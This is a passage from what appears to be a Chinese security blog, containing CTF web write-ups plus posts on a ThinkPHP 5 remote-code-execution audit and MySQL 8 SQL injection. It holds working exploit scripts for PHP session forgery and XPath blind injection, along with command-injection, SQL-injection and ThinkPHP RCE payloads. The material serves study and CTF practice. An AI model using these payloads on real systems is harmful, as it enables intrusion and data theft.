RuntimeException(&#x27;invalid upload&#x27;); &#125; $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;]; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]); if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123; $upload_result = &quot;uploaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;&#125; elseif ($direction === &quot;download&quot;) &#123; try&#123; $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;)); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; if(!file_exists($file_path)) &#123; throw new RuntimeException(&#x27;file not exist&#x27;); &#125; header(&#x27;Content-Type: application/force-download&#x27;); header(&#x27;Content-Length: &#x27;.filesize($file_path)); header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;); if(readfile($file_path))&#123; $download_result = &quot;downloaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; exit;&#125;?&gt; 好长一段，这么长当然得一段段来看。首先是第一段： 1234567891011if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)&#123; $filename=&#x27;/var/babyctf/success.txt&#x27;; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;&#125; 这段比较简单，也是我们能获取flag的核心，只要满足两个条件就可以了： session中的username的值要为admin 存在文件/var/babyctf/success.txt但是默认将我们的session中username的值设置为guest。 第二段： 1234567891011121314151617181920if($direction === &quot;upload&quot;)&#123; try&#123; if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123; throw new RuntimeException(&#x27;invalid upload&#x27;); &#125; $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;]; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]); if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123; $upload_result = &quot;uploaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;&#125; 文件上传，过滤了目录穿越，文件名也进行了哈希，不过都没啥用，唯一的作用可以说就是在/var/babyctf/下任意上传文件了，那么我们肯定要通过这个部分上传success.txt。 第三段： 123456789101112131415161718192021elseif ($direction === &quot;download&quot;) &#123; try&#123; $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;)); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; if(!file_exists($file_path)) &#123; throw new RuntimeException(&#x27;file not exist&#x27;); &#125; header(&#x27;Content-Type: application/force-download&#x27;); header(&#x27;Content-Length: &#x27;.filesize($file_path)); header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;); if(readfile($file_path))&#123; $download_result = &quot;downloaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; 任意文件下载，同样过滤了目录穿越，可以从/vat/babyctf/中进行任意文件读取。 php的session默认存储文件名是sess_+PHPSESSID的值，我们先读取cookie中的session并尝试读取： 1direction=download&amp;attr=&amp;filename=sess_73e1e2caaba56997530a478afabf59d0 看到返回： 1\busernames:5:&quot;guest&quot;; 发现有一个不可打印字符，那么就可以判断储存模式是php_binary了。因为这个模式的储存方式是键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值，那么我们就可以根据这个规律伪造session了： 123\busernames:5:&quot;admin&quot;;sha256:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 那么我们只要上传伪造的session文件和success.txt就可以了，直接用exp： 1234567891011121314151617181920212223242526272829import hashlibfrom io import BytesIOimport requests url = &#x27;http://5a0cdaad-fb6e-49f9-99ae-94f44a342d8b.node4.buuoj.cn:81/&#x27;# 第一步:上传伪造的session文件files = &#123;&quot;up_file&quot;: (&quot;sess&quot;, BytesIO(&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;.encode(&#x27;utf-8&#x27;)))&#125;data = &#123; &#x27;direction&#x27;:&#x27;upload&#x27;, &#x27;attr&#x27;:&#x27;&#x27;&#125;res = requests.post(url, data=data ,files=files) # 第二步:获取后面请求时的session_idsession_id = hashlib.sha256(&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;.encode(&#x27;utf-8&#x27;)).hexdigest() # 第三步:在/var/babyctf/下创建success.txt目录data1 = &#123; &#x27;attr&#x27;: &#x27;success.txt&#x27;, &#x27;direction&#x27;: &#x27;upload&#x27;&#125;res1 = requests.post(url=url, data=data1, files=files) # 第四步:通过上面获取的session_id发起请求，获取flagcookie = &#123; &#x27;PHPSESSID&#x27;:session_id&#125;flag_res = requests.post(url,cookies = cookie)print(flag_res.text) 执行获取flag。 EasyBypass同样开门见源码： 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);$comm1 = $_GET[&#x27;comm1&#x27;];$comm2 = $_GET[&#x27;comm2&#x27;];if(preg_match(&quot;/\\&#x27;|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1)) $comm1 = &quot;&quot;;if(preg_match(&quot;/\\&#x27;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2)) $comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;$cmd = &quot;file $comm1 $comm2&quot;;system($cmd);?&gt; 真是一题简单的bypass呢（恼怒），这过滤的也太狠了吧。因为file命令打不开文件，只能判别文件的类型，因此我们在comm1中要利用引号和分号来进行命令的控制。 对比了一下过滤程度，comm1比较少一点，而且分号还在，那就从comm1开刀。 构建payload，先将引号闭合，接着用分号结束file语句，然后跟上flag读取命令，最后闭合后引号保障不会报错： 1?comm1=&quot;;tac /fla?;&quot;&amp;comm2=1 GET传入数据获取flag。 [RoarCTF 2019]Simple Upload审代码： 12345678910111213141516171819202122232425262728293031323334 &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123; public function index() &#123; show_source(__FILE__); &#125; public function upload() &#123; $uploadFile = $_FILES[&#x27;file&#x27;] ; if (strstr(strtolower($uploadFile[&#x27;name&#x27;]), &quot;.php&quot;) ) &#123; return false; &#125; $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpeg&#x27;);// 设置附件上传类型 $upload-&gt;rootPath = &#x27;./Public/Uploads/&#x27;;// 设置附件上传目录 $upload-&gt;savePath = &#x27;&#x27;;// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) &#123;// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; &#125;else&#123;// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#x27;file&#x27;][&#x27;savepath&#x27;].$info[&#x27;file&#x27;][&#x27;savename&#x27;] ; echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); &#125; &#125;&#125; [RootersCTF2019]babyWeb进入了网页告诉我们ban掉了一批sql用的关键词，看来是sql注入了，但这题挺离谱的，万能密码注进去就返回flag了，有点没看懂。 payload： 11 || 1=1 limit 0,1 [NPUCTF2020]ezlogin进网页上来一个登录框，fuzz一下发现不是sql，抓包发现是一个xml，那么先怀疑xxe，但是没有明显的注入点，而且进行登录的话xxe明显不适用，那么就怀疑xpath注入了。 关于xpath可以参考下面这篇文章：xpath注入详解 那么就是一层一层扒到存有账号与密码的节点，并且读取出数据进行登录应该就可以了，直接网上找exp了，不是很想自己写： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requestsimport reimport timesession = requests.session()url = &quot;http://e6bcddf2-8f0b-411a-ba79-90a1b4820660.node3.buuoj.cn&quot;chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;head = &#123; #&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36&#x27;, &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;, #&quot;Cookie&quot;:&quot;UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c&quot; &#125;find = re.compile(r&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;,re.S)result = &quot;&quot;#猜测根节点名称payload_1 = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;#猜测子节点名称payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;#猜测accounts的节点payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;#猜测user节点payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;#跑用户名和密码payload_username =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;def get_token(): #获取token的函数 resp = session.get(url=url) #如果在这里用headers会得到超时的界面 token = find.findall(resp.text)[0] #print(token) return tokenfor x in range(1,100): for char in chars: time.sleep(0.3) token = get_token() playload = payload_1.format(x, char, token) #根据上面的playload来改 #print(playload) resp = session.post(url=url,headers=head, data=playload) #print(resp.text) if &quot;非法操作&quot; in resp.text: result += char print(result) break if &quot;用户名或密码错误&quot; in resp.text: breakprint(result) 得到账号密码： 1username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f 将密码进行somd5解码得到密码为gtfly123，登陆进去后页面什么都无，查看源码发现base64，解码后告诉我们flag在/flag中。url存在file参数，说明可能存在文件读取，直接读取flag失败，伪代码读取成功，payload： 1Php://filter/convert.Base64-encode/resource=/flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"Thinkphp框架原理及简单审计","slug":"Thinkphp框架原理及简单审计","date":"2022-07-07T07:02:32.000Z","updated":"2022-07-07T11:18:58.372Z","comments":true,"path":"2022/07/07/Thinkphp框架原理及简单审计/","link":"","permalink":"http://example.com/2022/07/07/Thinkphp%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/","excerpt":"前言 考完试终于有时间来进行一波网安的学了，ciscn几道框架题看得我头皮发麻，正好趁着暑假开始学习框架，我们先从php框架开始。","text":"前言 考完试终于有时间来进行一波网安的学了，ciscn几道框架题看得我头皮发麻，正好趁着暑假开始学习框架，我们先从php框架开始。 关于php框架php的开源框架有很多，目前在ctf中遇到的比较多的框架有Thinkphp、zendframework(Laminas)等等，而我们就从资料比较多、难度也没那么大的Thinkphp5.0框架开始。 目录结构123456789101112131415161718192021222324application 应用目录 ---|index 模块 ---|controller 控制器 ---|model 模型 ---|view 视图 ---|config.php 模块配置文件 服务的对象是index模块 ---|database.php 模块数据库的配置文件,服务的对象是index模块 ---|common.php 模块公共函数文件,服务的对象是index模块 ---|common.php 模块的公共文件(公共函数 调用第三方类库 发送邮件 发送短信...) ---|config.php 应用配置文件 (作用对象是所有的模块) ---|database.php 数据库配置文件 (作用对象是所有的模块，配置连接数据库的信息) ---|route.php 路由目录 extend 扩展包目录 (存放的是三方类 发送邮件类,支付类...) public 根目录 ---|static 静态资源目录(存放css js image....) runtime 缓存目录 thinkphp 框架核心目录 ---|library ---|think 核心类库(model page file...) ---|lang语言包 ---|tpl模板系统目录 ---|convention.php 惯例配置文件 vendor 三方扩展目录 composer.json 工具包信息记录文件 运行原理 mvc设计模式m（模型）v（视图）c（控制器）是Thinkphp的一大特色，c通过调度m获取数据，加载v将数据返回给客户端。 模型层（m）在m层中，比较复杂的项目设计需要区分数据层、逻辑层、服务层等不同的模型层，因此可以在模块目录下面创建Model、Logic和Service目录，把对用户表的所有模型操作分成三层： 数据层：Model/UserModel 用于定义数据相关的自动验证、自动完成和数据存取 逻辑层：Logic/UserLogic 用于定义用户相关的业务逻辑 服务层：Service/UserService 用于定义用户相关的服务接口等这三个模型操作类统一都要继承Model类。 视图层（v）以首页设置来说： 123456789class Index extends Controller&#123; /** * 首页 */ public function index() &#123; return $this-&gt;fetch(); &#125;&#125; fetch()传入的参数是模板名，用模板文件来输出。如果 fetch() 不传参数，程序会自动寻找 view/index/index.html渲染输出。如果传参数，比如传入” hello“，那么程序会寻找view/index/hello.html来渲染输出。 而如果使用display()来代替fetch()的话，会直接输出传递的内容，如果没有传递参数，会渲染出Layout，但不会有任何内容。如果传递参数, 比如 “hello”，那么页面会直接输出字符串 “hello”。 而view()的使用与fetch()相同，但写法上有一定不同： 123456789class Index extends Controller&#123; /** * 首页 */ public function index() &#123; return view(); &#125;&#125; 控制器层（c）c层由核心控制器和业务控制器组成，核心控制器由系统内部的App类完成，负责应用（包括模块、控制器和操作）的调度控制，包括HTTP请求拦截、转发、加载配置等；而业务控制器则由用户定义的控制器类完成。 同样在复杂项目中可以对业务控制器进行分层，分为访问控制器和事件控制器，访问控制器负责外部交互响应，通过URL请求响应，例如 http://域名/Home/User/login.html；事件控制器负责内部的事件响应，并且只能在内部调用，所以是和外部隔离的，确切的说，访问控制器之外的分层控制器都只能内部实例化调用。 url访问123不支持普通的模式 http://www.tp5.com/index.php?m=index&amp;c=Index&amp;a=add只支持pathinfo模式 http://www.tp5.com/index.php/index/Index/add?name=jungepathinfo 模式: 简化url地址,可以提高网站的收录排名,有利于seo优化 路由1234567891011121314151617(1)普通使用:Route::rule(&#x27;路由规则&#x27;, &#x27;模块/控制器/方法&#x27;, &#x27;请求方式&#x27;, [伪静态设置], [参数类型设置]);如：Route::rule(&#x27;/admin/:id&#x27;, &#x27;admin/Index/index&#x27;, &#x27;get&#x27;, [&#x27;ext&#x27; =&gt; &#x27;html&#x27;], [&#x27;id&#x27; =&gt; &#x27;\\d+&#x27;]);(2)请求方式路由Route::get(&quot;路由规则&quot;,&quot;模块/控制器/方法&quot;);格式:Route::get(&quot;/test&quot;,&quot;index/Index/index&quot;);(3)隐式路由把所有的访问操作统统交给同一个路由规则（/test）处理 Route::controller(&quot;路由规则&quot;,&quot;模块/控制器&quot;);格式:Route::controller(&quot;/test&quot;,&quot;index/Index&quot;);(4)路由别名通过路由别名访问控制器下的所有方法Route::alias(&quot;别名&quot;,&quot;模块/控制器&quot;);格式:Route::alias(&quot;users&quot;,&quot;admin/Test&quot;); 代码审计我们以Thinkphp5的远程代码RCE为例进行漏洞分析。首先查看thinkphp/library/think/App.php:540: 1234567891011121314// 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config[&#x27;url_domain_deploy&#x27;]); $must = !is_null(self::$routeMust) ? self::$routeMust : $config[&#x27;url_route_must&#x27;]; if ($must &amp;&amp; false === $result) &#123; // 路由无效 throw new RouteNotFoundException(); &#125; &#125; if (false === $result) &#123; // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索 $result = Route::parseUrl($path, $depr, $config[&#x27;controller_auto_search&#x27;]); &#125; return $result; &#125; 由于没有在配置文件中定义任何路由，因此按照路由到模块/控制器的方法进行解析调度，接下来进行跟进thinkphp/library/think/Route.php:1238: 123456789101112131415161718// 解析操作 $action = !empty($path) ? array_shift($path) : null; // 解析额外参数 self::parseUrlParams(empty($path) ? &#x27;&#x27; : implode(&#x27;|&#x27;, $path)); // 封装路由 $route = [$module, $controller, $action]; // 检查地址是否被定义过路由 $name = strtolower($module . &#x27;/&#x27; . Loader::parseName($controller, 1) . &#x27;/&#x27; . $action); $name2 = &#x27;&#x27;; if (empty($module) || isset($bind) &amp;&amp; $module == $bind) &#123; $name2 = strtolower(Loader::parseName($controller, 1) . &#x27;/&#x27; . $action); &#125; if (isset(self::$rules[&#x27;name&#x27;][$name]) || isset(self::$rules[&#x27;name&#x27;][$name2])) &#123; throw new HttpException(404, &#x27;invalid request:&#x27; . str_replace(&#x27;|&#x27;, $depr, $url)); &#125; &#125; return [&#x27;type&#x27; =&gt; &#x27;module&#x27;, &#x27;module&#x27; =&gt; $route]; 可以发现解析url的时候框架知识将URL按照分割符进行分割，并没有进行安全检测。继续跟进thinkphp/library/think/App.php:333: 123456789101112131415161718192021222324252627282930// 模块初始化 if ($module &amp;&amp; $available) &#123; // 初始化模块 $request-&gt;module($module); $config = self::init($module); // 模块请求缓存检查 $request-&gt;cache($config[&#x27;request_cache&#x27;], $config[&#x27;request_cache_expire&#x27;]); &#125; else &#123; throw new HttpException(404, &#x27;module not exists:&#x27; . $module); &#125; &#125; else &#123; // 单一模块部署 $module = &#x27;&#x27;; $request-&gt;module($module); &#125; // 当前模块路径 App::$modulePath = APP_PATH . ($module ? $module . DS : &#x27;&#x27;); // 是否自动转换控制器和操作名 $convert = is_bool($convert) ? $convert : $config[&#x27;url_convert&#x27;]; // 获取控制器名 $controller = strip_tags($result[1] ?: $config[&#x27;default_controller&#x27;]); $controller = $convert ? strtolower($controller) : $controller; // 获取操作名 $actionName = strip_tags($result[2] ?: $config[&#x27;default_action&#x27;]); $actionName = $convert ? strtolower($actionName) : $actionName; // 设置当前请求的控制器、操作 $request-&gt;controller(Loader::parseName($controller, 1))-&gt;action($actionName); 在攻击时注意使用一个已存在的module，否则会抛出异常，无法继续运行。 接下来对控制器进行实例化的部分进行跟进thinkphp/library/think/Loader.php:: 123456789101112131415161718192021222324252627282930313233343536public static function action($url, $vars = [], $layer = &#x27;controller&#x27;, $appendSuffix = false) &#123; $info = pathinfo($url); $action = $info[&#x27;basename&#x27;]; $module = &#x27;.&#x27; != $info[&#x27;dirname&#x27;] ? $info[&#x27;dirname&#x27;] : Request::instance()-&gt;controller(); $class = self::controller($module, $layer, $appendSuffix); if ($class) &#123; if (is_scalar($vars)) &#123; if (strpos($vars, &#x27;=&#x27;)) &#123; parse_str($vars, $vars); &#125; else &#123; $vars = [$vars]; &#125; &#125; return App::invokeMethod([$class, $action . Config::get(&#x27;action_suffix&#x27;)], $vars); &#125; &#125;public static function controller($name, $layer = &#x27;controller&#x27;, $appendSuffix = false, $empty = &#x27;&#x27;) &#123; if (strpos($name, &#x27;\\\\&#x27;)) &#123; $class = $name; &#125; else &#123; if (strpos($name, &#x27;/&#x27;)) &#123; list($module, $name) = explode(&#x27;/&#x27;, $name); &#125; else &#123; $module = Request::instance()-&gt;module(); &#125; $class = self::parseClass($module, $layer, $name, $appendSuffix); &#125; if (class_exists($class)) &#123; return App::invokeClass($class); &#125; elseif ($empty &amp;&amp; class_exists($emptyClass = self::parseClass($module, $layer, $empty, $appendSuffix))) &#123; return new $emptyClass(Request::instance()); &#125; &#125; 正常情况下应该获取到对应控制器类的实例化对象，而我们现在得到了一个\\think\\App的实例化对象，进而通过url调用其任意的public方法，同时解析url中的额外参数，当作方法的参数传入。 payload: 1?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 总结整个流程跟进分析下来感觉还是很吃力的，对于框架的漏洞挖掘可以看得出还是相当有难度的。之后应该也会刷刷vulhub学习一些漏洞。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php框架","slug":"web-php框架","permalink":"http://example.com/tags/web-php%E6%A1%86%E6%9E%B6/"}]},{"title":"mysql8下的sql注入","slug":"mysql8下的sql注入","date":"2022-06-03T07:07:11.000Z","updated":"2022-06-03T13:59:32.052Z","comments":true,"path":"2022/06/03/mysql8下的sql注入/","link":"","permalink":"http://example.com/2022/06/03/mysql8%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/","excerpt":"前言 之前就想写关于这方面的博客了，但是因为没怎么碰到一直没写。后来ISCC出现了这个知识点，因此还是觉得应该写写。","text":"前言 之前就想写关于这方面的博客了，但是因为没怎么碰到一直没写。后来ISCC出现了这个知识点，因此还是觉得应该写写。 新增语法介绍table语句语法： 1TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] table语句的作用是列出表中的全部内容，可以说是select的平替了，我们在mysql中来试着使用一下： 123456789101112131415161718192021222324252627282930313233343536373839mysql&gt; table users;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec) 可以看到两条命令的效果是一样的，当然根据语法，table后也可以加上order by以及limit指令进行输出： 1234567891011121314151617181920212223242526272829mysql&gt; table users order by username;+----+----------+------------+| id | username | password |+----+----------+------------+| 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 || 2 | Angelina | I-kill-you || 7 | batman | mob!le || 12 | dhakkan | dumbo || 1 | Dumb | Dumb || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious |+----+----------+------------+13 rows in set (0.03 sec)mysql&gt; table users limit 0,3;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword |+----+----------+------------+3 rows in set (0.00 sec) 当然作为平替，联合查询也是支持的，同样的，列数必须相等才可以查询。但是，table语句不支持任何过滤，因此不支持where语句的使用。 values语法： 12345678910VALUES row_constructor_list [ORDER BY column_designator] [LIMIT number]row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...]value_list: value[, value][, ...]column_designator: column_index values的语法看起来很复杂，但其实理解起来很简单，拿来造表的神器，我们来举个例子： 123456789mysql&gt; VALUES ROW(1,-2,3), ROW(5,7,9), ROW(4,6,8);+----------+----------+----------+| column_0 | column_1 | column_2 |+----------+----------+----------+| 1 | -2 | 3 || 5 | 7 | 9 || 4 | 6 | 8 |+----------+----------+----------+3 rows in set (0.00 sec) 同样这个函数可以使用order by进行排序： 123456789mysql&gt; VALUES ROW(1,-2,3), ROW(5,7,9), ROW(4,6,8) ORDER BY column_1;+----------+----------+----------+| column_0 | column_1 | column_2 |+----------+----------+----------+| 1 | -2 | 3 || 4 | 6 | 8 || 5 | 7 | 9 |+----------+----------+----------+3 rows in set (0.00 sec) 盲注常规套路还是基本一致的，但是table不能像select控制列数，除非列数一样的表，不然都回显不出来，也需要使用盲注。 比如我们注入数据库名： 11&amp;&amp;(&#x27;def&#x27;,&#x27;m&#x27;,&#x27;&#x27;,4,5,6)&lt;(table information_schema.schemata limit 1); 要注意的是，如果注入时前一个字符判断不正确，那么就会整段垮掉，后面的也会变得不正确。注意判断的时候后一个列名一定要用字符表示，不能用数字，不然判断到前一个最后一个字符会判断不出： 12(&#x27;def&#x27;,&#x27;mysql&#x27;,3,4,5,6)&lt;(table information_schema.schemata limit 1); #判断错误(&#x27;def&#x27;,&#x27;mysql&#x27;,&#x27;&#x27;,4,5,6)&lt;(table information_schema.schemata limit 1); #判断正确 盲注payload： 123456789//爆表(&#x27;def&#x27;,&#x27;security&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit 325,1);//爆字段(&#x27;def&#x27;,&#x27;security&#x27;,&#x27;users&#x27;,&#x27;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit 3415,1);//爆数据(1,&#x27;&#x27;,&#x27;&#x27;) &lt; (table users limit 1);ps.如果没有得到数据类型的话还是需要猜的，比如ID为1，前面就不能写成&#x27;1&#x27; 如果过滤了常用的infor表，可以使用mysql.innodb_table_stats代替。 [ISCC2022]Easy_SQL就拿这个最近的题复现下吧，刚开始是要我们找邮箱，URL中有一个id参数可以注入。题目设置了select过滤，因此使用table。 可以采用盲注法注入出表名为emails，使用联合注入找到压缩包名称： 1?id=1 union table emails limit 7,1--+ 下载下来是页面源码，查看关键部分代码： 123456789$sql = &quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND passwd= &#x27;$&#123;passwd&#125;&#x27;&quot;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; $row = $result-&gt;fetch_assoc(); if ( $row[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; $row[&#x27;passwd&#x27;] ) &#123; if ($row[&#x27;passwd&#x27;] == $passwd) &#123; die($flag); 当username为admin且对应密码正确时打印flag，那么我们就可以使用value来改变表的内容： 1username=admin&#x27; union values row(10,&#x27;admin&#x27;,1)#&amp;passwd=1 这样admin的passwd就相当于为1了，因此触发条件拿到flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"简单的web加固","slug":"简单的web加固","date":"2022-05-30T09:09:50.000Z","updated":"2022-05-31T13:45:13.123Z","comments":true,"path":"2022/05/30/简单的web加固/","link":"","permalink":"http://example.com/2022/05/30/%E7%AE%80%E5%8D%95%E7%9A%84web%E5%8A%A0%E5%9B%BA/","excerpt":"前言 ciscn初赛过了就要准备分区赛了，当然就要来练习awd plus了，awdp最重要的一环还是加固，因此这篇博客来总结一下一些简单常用的web加固。","text":"前言 ciscn初赛过了就要准备分区赛了，当然就要来练习awd plus了，awdp最重要的一环还是加固，因此这篇博客来总结一下一些简单常用的web加固。 常见加固汇总sql注入关于sql注入加固的方式有许多不同的方法，这里就简单介绍几个常用方法。 